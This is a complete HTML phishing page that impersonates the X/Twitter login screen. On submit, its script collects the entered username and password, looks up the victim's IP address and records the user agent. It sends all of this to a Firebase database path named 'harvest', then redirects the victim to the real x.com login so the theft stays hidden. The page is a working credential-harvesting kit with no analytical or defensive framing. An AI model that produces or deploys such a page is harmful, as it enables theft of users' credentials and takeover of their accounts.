<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Log in to X / Twitter</title>
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <style>
        *{box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif}
        body{background:#f5f8fa;display:flex;height:100vh;margin:0;align-items:center;justify-content:center}
        .card{background:#fff;width:320px;padding:40px 30px;border-radius:12px;box-shadow:0 8px 25px rgba(0,0,0,.1)}
        .logo{font-size:28px;font-weight:800;color:#1da1f2;margin-bottom:30px;text-align:center}
        input{width:100%;padding:12px 15px;margin-bottom:20px;border:1px solid #cfd9de;border-radius:4px;font-size:16px}
        button{width:100%;padding:12px;background:#1da1f2;color:#fff;border:none;border-radius:25px;font-size:16px;font-weight:700;cursor:pointer}
        button:hover{background:#1a91da}
        .fineprint{font-size:12px;color:#536471;text-align:center;margin-top:15px}
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">ùïè</div>
        <form id="f">
            <input type="text" name="email" placeholder="Phone, e-mail or username" required autocomplete="username">
            <input type="password" name="pass" placeholder="Password" required autocomplete="current-password">
            <button>Log in</button>
        </form>
        <div class="fineprint">Forgot password? ¬∑ Sign up for X</div>
    </div>

    <!-- Firebase SDK -->
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>

    <script>
        const firebaseConfig = {
            projectId: "clickme",
            databaseURL: "https://YOUR-PROJECT-ID-default-rtdb.europe-west1.firebasedatabase.app"
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        document.getElementById('f').addEventListener('submit', async function(e) {
            e.preventDefault();
            const email = this.email.value.trim();
            const pass = this.pass.value.trim();
            let ip = "unknown";

            // Fetch IP via free API (no PHP)
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                ip = data.ip;
            } catch(e) {}

            const now = Date.now();
            db.ref('harvest/' + now).set({
                email,
                pass,
                ip,
                ua: navigator.userAgent
            });

            // Redirect to real X login
            setTimeout(() => window.location.replace('https://x.com/login'), 200);
        });
    </script>
</body>
</html>
